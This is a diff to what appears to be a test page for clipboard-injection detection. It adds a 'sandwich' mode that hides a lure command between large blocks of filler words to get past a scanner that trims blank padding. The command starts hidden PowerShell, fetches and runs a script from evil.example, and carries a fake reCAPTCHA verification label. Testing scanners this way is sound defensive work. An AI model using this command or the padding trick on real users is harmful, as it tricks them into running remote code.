@@ -7,6 +7,7 @@
        exec       the same, through execCommand("copy")
        fullscreen the first click goes fullscreen, the second copies the command
        padded     the same command behind 70 KB of blank lines
+       sandwich   the same command between two 70 KB blocks of ordinary words
        ordinary   a plain sentence
        docs       an npm command, as a developer docs site would offer
      The title says how it went: wrote, or error:<name>. -->
@@ -20,6 +21,8 @@
   var mode = new URLSearchParams(location.search).get('mode') || 'command';
   var COMMAND = 'cmd /c start /min powershell -w hidden -c "iex (irm https://evil.example/a.ps1)" ' +
       '# I am not a robot - reCAPTCHA Verification ID: 6283';
+  // Words, not blank space: blank padding is trimmed away before the scan.
+  var FILLER = new Array(2700).join('lorem ipsum dolor sit amet ');
   var texts = {
     command: COMMAND,
     exec: COMMAND,
